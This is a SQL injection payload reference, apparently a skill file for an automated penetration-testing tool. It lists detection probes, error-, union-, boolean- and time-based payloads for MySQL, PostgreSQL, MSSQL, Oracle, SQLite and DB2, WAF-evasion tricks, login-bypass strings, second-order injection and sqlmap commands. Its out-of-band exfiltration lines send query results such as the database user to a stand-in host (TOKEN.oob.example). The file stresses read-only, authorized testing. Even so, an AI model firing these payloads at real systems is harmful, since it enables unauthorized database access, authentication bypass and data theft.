# SQLi payloads by context + DBMS (shared by sqli-inband / sqli-blind)
# SELECT-safe only. No stacked/destructive queries. Confirm injection before extracting; extract read-only.

## Anomaly probes (detection — feeder)
```
'    "    )    '))    `       -> error / differential = candidate
1-0            (numeric context: if result == value for 1, injectable)
' AND '1'='1   vs   ' AND '1'='2         (string context boolean differential)
 AND 1=1       vs    AND 1=2             (numeric context)
```

## Query-context breakout
| context | break out with |
|---|---|
| string `'...'` | `'` then payload then `-- -` or `'||'` |
| numeric | no quote; ` AND `, arithmetic |
| identifier / ORDER BY | `1,(SELECT ...)` / `1 ASC--` ; column-count via `ORDER BY N` |
| LIKE | `%` and `'` |
| JSON | break the JSON string then the SQL string |

## In-band
```
# error-based (leak via error message)
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -        (MySQL)
' AND 1=cast((SELECT version()) as int)-- -                      (Postgres)
' AND 1=convert(int,(SELECT @@version))-- -                      (MSSQL)
# union-based (match column count + types)
' ORDER BY 5-- -                 (find column count)
' UNION SELECT NULL,NULL,version(),NULL,NULL-- -
```

## Blind
```
# boolean
' AND (SELECT substring(version(),1,1))='8'-- -
# time
' AND SLEEP(5)-- -                           (MySQL)
'; SELECT pg_sleep(5)-- -                     (Postgres — note: stacked; use only if safe + approved)
' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))x)-- -
IF(1=1,SLEEP(5),0)                            (conditional time)
# OOB (where supported)
' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.OOB\\x'))-- -   (MySQL/Windows)
UTL_HTTP / DBMS_LDAP (Oracle) ; xp_dirtree (MSSQL)
```

## WAF bypass (minimal, escalate only if blocked)
```
/**/  inline comments, case toggling, URL/double-URL encoding, UNION/**/SELECT,
whitespace alt (%09,%0a), concat via 0x hex, scientific notation for numbers
```

## Tooling
`sqlmap -r req.txt --batch --level=N --risk=1 --technique=BEUST --dbms=<DBMS>` — use `--risk=1` (no
destructive), confirm findings MANUALLY, and do not dump real PII.

---
## Advanced — OOB exfil · no-space/WAF bypass · header SQLi

### Out-of-band (OOB) exfil by DBMS — attributable blind proof
Use when there is no in-band reflection and timing is slow/noisy. Fire a unique token to a collaborator.
```
# MySQL (Windows only; UNC path triggers SMB/DNS lookup). Precondition: secure_file_priv unset/permissive.
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.TOKEN.oob.example\\x'))-- -
#   file write (needs FILE priv + writable web dir + secure_file_priv): ... INTO OUTFILE '/var/www/html/x.txt'
#   check first:  SELECT @@secure_file_priv;    (empty = anywhere, NULL = disabled)
# MSSQL — DNS/UNC via xp_dirtree (no xp_cmdshell needed); exfil via bcp if command exec is approved.
'; EXEC master..xp_dirtree '\\TOKEN.oob.example\x'-- -
# Oracle — UTL_HTTP / UTL_INADDR (DNS) / UTL_TCP
' AND (SELECT UTL_INADDR.get_host_address('TOKEN.oob.example')) IS NOT NULL-- -
' AND (SELECT UTL_HTTP.request('http://TOKEN.oob.example/?d='||(SELECT user FROM dual)) FROM dual) IS NOT NULL-- -
```
`secure_file_priv` gates MySQL file read/write — always read it before claiming file-based OOB/RCE.

### No-space / WAF bypass (escalate only when a filter blocks the basic form)
```
# whitespace alternatives (any of these for a space):
%09 (tab)  %0a (LF)  %0c (FF)  %0d (CR)  %a0 (non-breaking)  /**/  ()
#   e.g.  'OR(1)=(1)-- -      'OR/**/1=1-- -      '%0aOR%0a1=1-- -
# keyword/char obfuscation:
CONCAT(0x61,0x62)            # hex literals, no quotes
CHAR(97,98)                  # build strings without quotes
UNION/**/SELECT   UniON SeLeCt   %55NION (url-encode first byte)
# double-URL-encode, scientific notation (1e0), comment-splitting /*!50000UNION*/
```

### Injection surface beyond params — HEADER SQLi
Test these sinks too (logged/stored → often reach SQL): `User-Agent`, `Referer`, `X-Forwarded-For`,
`X-Forwarded-Host`, `Cookie` values, and any custom header the app persists. Same payloads; confirm
the same way (error/boolean/time/OOB).

---
## Extended arsenal — DBMS fingerprinting

Identify the backend before writing extraction payloads — it decides every function name below. Use benign
differentials (true vs error) and version strings; one probe per request.
```
# Concatenation differential (same logical value, DBMS-specific syntax -> which one returns the row):
' AND 'a'='a                         # baseline true (all)
' AND 'ab'='a'||'b                   # Oracle / PostgreSQL / SQLite / DB2 (|| = concat)
' AND 'ab'=CONCAT('a','b')-- -       # MySQL/MariaDB / MSSQL (also PG/DB2)
' AND 'ab'='a'+'b'-- -               # MSSQL (+ = string concat)
# Version string (route into error/union/boolean once DBMS known):
MySQL/MariaDB   version()  @@version  @@version_comment      # 'MariaDB' in banner => MariaDB
PostgreSQL      version()                                    # 'PostgreSQL 1x.x'
MSSQL           @@version  SERVERPROPERTY('ProductVersion')
Oracle          (SELECT banner FROM v$version WHERE rownum=1)
SQLite          sqlite_version()                             # no server-info functions / no users
DB2             (SELECT service_level FROM sysibmadm.env_inst_info)
# Cheap dialect tells (true only on that engine):
' AND @@version IS NOT NULL-- -                       # MySQL/MariaDB or MSSQL
' AND sqlite_version() IS NOT NULL-- -                # SQLite
' AND 1=(SELECT 1 FROM dual)-- -                      # Oracle (dual) / MySQL tolerate dual
' AND 1=(SELECT 1 FROM sysibm.sysdummy1)-- -          # DB2
' AND rownum=1-- -                                    # Oracle
```

---
## Extended arsenal — per-DBMS function & syntax matrix

Lookup table for building payloads once the DBMS is known. `s`=string/subquery, `c`=char expr.

| need | MySQL / MariaDB | PostgreSQL | MSSQL | Oracle | SQLite | DB2 |
|---|---|---|---|---|---|---|
| version | `version()` `@@version` | `version()` | `@@version` | `(SELECT banner FROM v$version WHERE rownum=1)` | `sqlite_version()` | `(SELECT service_level FROM sysibmadm.env_inst_info)` |
| current user | `current_user()` `user()` | `current_user` | `SYSTEM_USER` `USER_NAME()` | `(SELECT user FROM dual)` | — (no users) | `CURRENT USER` |
| current db | `database()` | `current_database()` | `DB_NAME()` | `(SELECT global_name FROM global_name)` | — (file) | `CURRENT SERVER` |
| string concat | `CONCAT(a,b)` | `a\|\|b` `CONCAT(a,b)` | `a+b` `CONCAT(a,b)` | `a\|\|b` `CONCAT(a,b)` | `a\|\|b` | `a\|\|b` `CONCAT(a,b)` |
| substring | `SUBSTRING(s,1,1)` `MID(s,1,1)` | `SUBSTRING(s FROM 1 FOR 1)` `substr()` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` | `substr(s,1,1)` | `SUBSTR(s,1,1)` |
| ascii / ord | `ASCII(c)` | `ASCII(c)` | `ASCII(c)` `UNICODE(c)` | `ASCII(c)` | `unicode(c)` | `ASCII(c)` |
| length | `LENGTH(s)` `CHAR_LENGTH(s)` | `LENGTH(s)` | `LEN(s)` | `LENGTH(s)` | `length(s)` | `LENGTH(s)` |
| char from code | `CHAR(65)` | `CHR(65)` | `CHAR(65)` | `CHR(65)` | `char(65)` | `CHR(65)` |
| conditional | `IF(c,a,b)` | `CASE WHEN c THEN a ELSE b END` | `IIF(c,a,b)` / `CASE` | `CASE WHEN...` / `DECODE(x,..)` | `CASE WHEN...` | `CASE WHEN...` |
| line comment | `-- ` (needs trailing space) `#` | `-- ` | `-- ` | `-- ` | `-- ` | `-- ` |
| block comment | `/* */` `/*! */` (version-exec) | `/* */` | `/* */` | `/* */` | `/* */` | `/* */` |
| time delay (inline) | `SLEEP(5)` | `(SELECT 1 FROM pg_sleep(5))` | none inline (needs stacked `WAITFOR`) | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` | none → heavy query | none → heavy query |

Notes: Oracle wraps constant `SELECT`s with `FROM dual`; UNION rows need a `FROM` clause. SQLite has no
users/`@@version`/error-leak primitives — favour boolean/UNION. MSSQL string concat is `+`. MariaDB shares
MySQL syntax but reports `MariaDB` in the banner (affects `/*!NNNNN */` version gates).

---
## Extended arsenal — error-based confirmation by DBMS

Surface a single benign value (version / current_user / a marker) inside an error message — the fastest in-band
proof when results aren't reflected. Read-only; confirm the point, never dump PII.
```
# MySQL / MariaDB
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT current_user())),1)-- -
# PostgreSQL — cast text into integer context:
' AND 1=CAST((SELECT version()) AS int)-- -
' AND 1=(SELECT version())::int-- -
# MSSQL — conversion error carries the value:
' AND 1=CONVERT(int,(SELECT @@version))-- -
' AND 1=CAST((SELECT DB_NAME()) AS int)-- -
# Oracle — XMLType / CTXSYS error carries the value:
' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(126)||(SELECT user FROM dual)||CHR(62))) FROM dual)-- -
' AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM dual))-- -        # needs CTXSYS package (feasibility)
# DB2 — type/eval error (limited); prefer boolean/union:
' AND 1=(SELECT CAST(service_level AS int) FROM sysibmadm.env_inst_info)-- -
# SQLite — no data-bearing error channel; use UNION or boolean-blind.
```

---
## Extended arsenal — UNION: column count & type matching

```
# 1) column count — increment until the error flips (ORDER BY is cheapest):
' ORDER BY 1-- -   ' ORDER BY 2-- -  ...  ' ORDER BY 9-- -     # first N that errors => N-1 columns
' GROUP BY 1,2,3-- -                                           # alt when ORDER BY is filtered
# 2) confirm with NULLs (type-agnostic) — add a FROM where required:
' UNION SELECT NULL-- -   ' UNION SELECT NULL,NULL-- -  ...
' UNION SELECT NULL,NULL FROM dual-- -                          # Oracle (constant rows need FROM dual)
# 3) find a string-compatible column (replace one NULL at a time with a marker):
' UNION SELECT 'qXq',NULL,NULL-- -   ' UNION SELECT NULL,'qXq',NULL-- -   # whichever renders = text column
# 4) pack the benign proof values into the one text column that renders:
' UNION SELECT NULL,concat(version(),0x7c,current_user()),NULL-- -        # MySQL
' UNION SELECT NULL,version()||'|'||current_user,NULL-- -                 # PG/Oracle/SQLite/DB2
' UNION SELECT NULL,@@version+'|'+SYSTEM_USER,NULL-- -                    # MSSQL
# type-mismatch dodge: keep rejecting columns NULL / cast:  CAST(x AS char)  x::text  CONVERT(varchar,x)
```

---
## Extended arsenal — boolean-blind inference (binary search)

One bit per request via a response differential (true page vs false page). Binary-search each char on its ASCII
code (~7 requests/char). Confirm the point and infer a minimal marker/metadata character — not a PII dump.
```
# generic template (swap SUBSTRING/ASCII per the matrix):
' AND ASCII(SUBSTRING((SELECT <target>),<pos>,1))>64-- -       # halve the range each step
' AND ASCII(SUBSTRING((SELECT <target>),<pos>,1))=97-- -       # confirm exact once bracketed
# per-DBMS substring/ascii forms:
MySQL/MSSQL   ASCII(SUBSTRING((SELECT version()),1,1))>77
PostgreSQL    ASCII(SUBSTRING((SELECT version()) FROM 1 FOR 1))>77
Oracle        ASCII(SUBSTR((SELECT user FROM dual),1,1))>77
SQLite        unicode(substr((SELECT sqlite_version()),1,1))>50
DB2           ASCII(SUBSTR((SELECT service_level FROM sysibmadm.env_inst_info),1,1))>50
# existence / length first (bound the loop; presence, no data):
' AND (SELECT LENGTH((SELECT version())))>10-- -
' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='users')-- -
# bit-wise variant (fixed 8 requests/char):
' AND (ASCII(SUBSTRING((SELECT version()),1,1))>>0)&1=1-- -
```

---
## Extended arsenal — time-based confirmation (inline, no stacking)

SELECT-safe = **inline** delay inside the existing query (no `;`). Gate the delay on the condition so response
time carries the bit. Keep sleeps short (2–5s) and rate-limited; use only to confirm the injection point.
```
# MySQL / MariaDB
' AND IF((<cond>),SLEEP(3),0)-- -
' AND (SELECT 1 FROM (SELECT SLEEP(3) WHERE (<cond>))x) IS NOT NULL-- -
# PostgreSQL  (inline pg_sleep — NOT the stacked ';SELECT pg_sleep' form)
' AND (SELECT CASE WHEN (<cond>) THEN (SELECT 1 FROM pg_sleep(3)) ELSE 1 END)=1-- -
# Oracle  (DBMS_PIPE.RECEIVE_MESSAGE returns inline; no exec priv needed)
' AND 1=(SELECT CASE WHEN (<cond>) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ELSE 1 END FROM dual)-- -
# MSSQL — no inline delay; WAITFOR needs a stacked statement (OUT of SELECT-safe scope).
#         Prefer boolean/error/OOB on MSSQL.
# SQLite — no sleep; bounded heavy expression gated on the condition:
' AND CASE WHEN (<cond>) THEN like('a',upper(hex(randomblob(20000000)))) ELSE 1 END-- -   # bounded blob size
# DB2 — no sleep; bounded conditional heavy cross-join:
' AND (SELECT CASE WHEN (<cond>) THEN (SELECT count(*) FROM sysibm.systables a,sysibm.systables b) ELSE 1 END FROM sysibm.sysdummy1)>0-- -
```

---
## Extended arsenal — comment, quote & whitespace variants

```
# line-comment terminators (pick what the parser accepts):
-- -      -- +      --%20      #        %23        /*comment*/
#   MySQL '#'/'-- ' ; Oracle/PG/MSSQL/SQLite/DB2 '-- ' ; mind the REQUIRED space after '--'
# close the statement without a comment (when '--'/'#' is stripped):
'||'      '+'       ' AND '1'='1      ')-- -        # balance quotes/parens instead of commenting
# quote styles / quote-free:
'  "  `                                            # try all three string delimiters
0x61646d696e        CHAR(97,100,109,105,110)       # 'admin' with no quotes (MySQL)
CHR(97)||CHR(100)                                  # 'ad' no quotes (Oracle/PG/SQLite/DB2)
# escaped-quote / backslash contexts (GBK / addslashes bypass):
%bf%27        %a8%27                               # multibyte that collapses to a stray quote in some charsets
# whitespace alternatives (any for a space):
%09 tab   %0a LF   %0c FF   %0d CR   %0b VT   %a0 NBSP   /**/   ()   +
#   e.g.  'OR(1)=(1)-- -      'OR/**/1=1-- -      '%0aOR%0a1=1-- -
```

---
## Extended arsenal — WAF / filter evasion (SQL-specific)

Escalate only when the basic form is blocked. Find the MINIMAL transform that restores a normal response with a
benign canary — don't burn payload strength. Pairs with the shared `waf-bypass` skill.
```
# case / inline comments (break keyword signatures):
UniON SeLeCt      UN/**/ION      SEL/**/ECT      /*!50000UNION*/ /*!50000SELECT*/   # MySQL version-gated exec-comment
# no-space (comment or paren as separator):
UNION/**/SELECT   UNION(SELECT(version()))        SELECT/**/version()
# strings without quotes:
0x61646d696e   CHAR(97,100,109)   CONCAT(0x61,0x62)   UNHEX(0x6162)                 # MySQL
CHR(65)||CHR(66)                                                                    # Oracle/PG/SQLite/DB2
# numbers without the obvious literal:
1-0   1+0   2-1   1e0   .1e1   0x01   true                                          # equal to 1 in numeric context
# keyword splitting / encoding:
%55NION  %53ELECT                                   # URL-encode first byte
%2555NION                                           # double-URL-encode (decoded twice by stacked proxies)
# logical-operator alternatives (when AND/OR filtered):
&&  ||   | 'a'='a   XOR   NOT                        # MySQL &&/|| ; mind operator-precedence
# comma-less (filters that block ','):
SUBSTRING(x FROM 1 FOR 1)                            # instead of SUBSTRING(x,1,1)   (MySQL/PG)
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b     # instead of UNION SELECT 1,2
LIMIT 1 OFFSET 0                                     # instead of LIMIT 0,1
# whitespace/encoding stacking: combine case + /**/ + %0a + hex until the signature no longer matches
```

---
## Extended arsenal — injection by clause & context

The injection's position in the query dictates the technique. UNION only works in a `SELECT` result position;
elsewhere, confirm with boolean/error/time on a gated subquery. All SELECT-safe, read-only.
```
# ORDER BY  (no quotes; column position — UNION won't apply, use conditional ordering / subquery error):
1,(CASE WHEN (1=1) THEN name ELSE id END)            # row order flips on the condition (boolean)
1,(SELECT CASE WHEN (<cond>) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)   # subquery error on false (PG/MSSQL)
(SELECT IF((<cond>),1,SLEEP(3)))                     # MySQL time-gated ordering
# LIMIT / OFFSET  (post-LIMIT syntax is narrow):
LIMIT 1 OFFSET (CASE WHEN (<cond>) THEN 0 ELSE 1 END)    # PostgreSQL accepts expressions here
#   MySQL <5.6: ...LIMIT 1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,version())),1)   # legacy error channel
# GROUP BY / HAVING  (filter after grouping):
HAVING 1=1-- -        ' GROUP BY id HAVING (SELECT 1 FROM ... WHERE <cond>)=1-- -
# IN ( ... )  /  LIKE :
id IN (1,2) OR (SELECT <cond>)                        x' OR '1'='1' LIKE '1
# WHERE string vs numeric already covered in the context table at the top of this file.
```
```
# INSERT (e.g. self-service registration that stores YOUR input) — confirm the point, don't weaponise the write.
#   You create only your OWN test row; prove evaluation via error/time inside a value, then stop.
foo',(SELECT CASE WHEN (<cond>) THEN SLEEP(3) ELSE 0 END),'x        # time-gated (MySQL; match column count)
foo',extractvalue(1,concat(0x7e,version())),'x                      # error-based single value (MySQL)
# UPDATE ... SET (e.g. editing YOUR OWN profile) — READ-ONLY CONFIRMATION ONLY:
#   operate on a record you own; NEVER widen the WHERE, never mass-update, never alter other rows.
bio'||(SELECT CASE WHEN (<cond>) THEN pg_sleep(3)::text ELSE '' END)||'              # PG time-gated (own row)
bio'+CAST((SELECT @@version) AS int)+'                                               # MSSQL error (own row)
```
```
# JSON-valued columns (data stored as JSON, queried with JSON functions):
MySQL     ' AND JSON_EXTRACT(data,'$.role')='admin'-- -     ' AND data->>'$.role'='admin'-- -
PostgreSQL' AND data->>'role'='admin'-- -                    ' AND (data#>>'{role}')='admin'-- -
#   injection often lands inside the JSON PATH string -> break the path then the SQL string:
$.role')='x' OR (1=1)-- -
```

---
## Extended arsenal — second-order & stored injection

The payload is stored benignly on one request (profile name, registration, note) and executes later when a
DIFFERENT query reads it back unescaped. Detection needs a two-step trace.
```
# 1) store a payload that stays inert at write time but breaks a later query:
display_name = admin'-- -               # or:  x' AND (SELECT <cond>)-- -
# 2) trigger the second query (view profile, admin list, report, search that re-uses the value):
#    confirm with the same channels (error/boolean/time) when the STORED value is later concatenated.
# attributable marker: store a unique token, then watch which later page/query reflects or errors on it.
```
Also test values that pass input validation but re-break after a decode/normalise step (URL/Unicode/`addslashes`
round-trip), and numeric IDs re-used in later string-built queries.

---
## Extended arsenal — authentication-bypass patterns (SELECT-safe)

Classic login-form logic breaks in a `WHERE user='X' AND pass='Y'` query. Confirm by landing as a KNOWN TEST
account (or any account on a test instance) — never to pivot into real users' data.
```
' OR '1'='1'-- -                     # neutralise the password check (string context)
' OR 1=1 LIMIT 1-- -                 # force one row
admin'-- -                           # comment out the password predicate, target 'admin'
admin'/*                             # block-comment the tail (MySQL/MSSQL)
' OR '1'='1' AND username='admin'-- - # target a specific test user
" OR ""="                            # double-quote variant
') OR ('1'='1                        # parenthesised WHERE
```

---
## Extended arsenal — OOB preconditions & feasibility map

OOB is the channel of last resort (in-band blocked + timing noisy). Base one-liners live in the Advanced
section above. ALWAYS fire a unique `TOKEN.oob.example` canary first and confirm the callback; exfil only a
benign value (version/current_user) afterwards — no PII, no mass extraction.

| DBMS | DNS/HTTP primitive | precondition to check first | notes |
|---|---|---|---|
| MySQL | `LOAD_FILE('\\\\x.TOKEN.oob.example\\a')` | `SELECT @@secure_file_priv` (empty=anywhere, NULL=disabled) + FILE priv; Windows for UNC→DNS | read-only; no `INTO OUTFILE` (write/destructive) |
| MSSQL | `xp_dirtree '\\TOKEN.oob.example\a'` / `xp_fileexist` | enabled by default; no sysadmin needed for DNS | avoid `xp_cmdshell` (command exec, out of scope) |
| Oracle | `UTL_INADDR.get_host_address` / `UTL_HTTP.request` / `DBMS_LDAP` | 11g+ needs a network ACL granted to the user | `UTL_INADDR`=DNS only (lowest footprint) |
| PostgreSQL | none native | `dblink`/`COPY ... TO PROGRAM` = superuser + command exec | feasibility only — out of SELECT-safe scope |
| DB2 / SQLite | none practical | — | use in-band/boolean instead |

`secure_file_priv` gates MySQL file read/write — always read it before claiming any file-based OOB.

---
## Extended arsenal — injection surface map

Every sink below can reach a SQL query; test each with the same confirmation channels (error/boolean/time/OOB).
De-dupe against the HEADER SQLi section above.
```
Query/body params · path segments · JSON body fields · GraphQL variables · XML/SOAP element values
Cookie values · custom headers the app persists · Referer / User-Agent / X-Forwarded-* (logged → stored)
Multipart filenames & field names · search/filter/sort params (often land in ORDER BY / LIKE)
File-import rows (CSV/XLSX) re-queried server-side · webhook/callback payloads · second-order stored fields
```
Confirm a candidate first (error/boolean/time/OOB canary), then extract read-only and minimal. Tooling:
`sqlmap -r req.txt --batch --risk=1 --technique=BEUST --dbms=<DBMS>` — verify MANUALLY, never dump real PII.
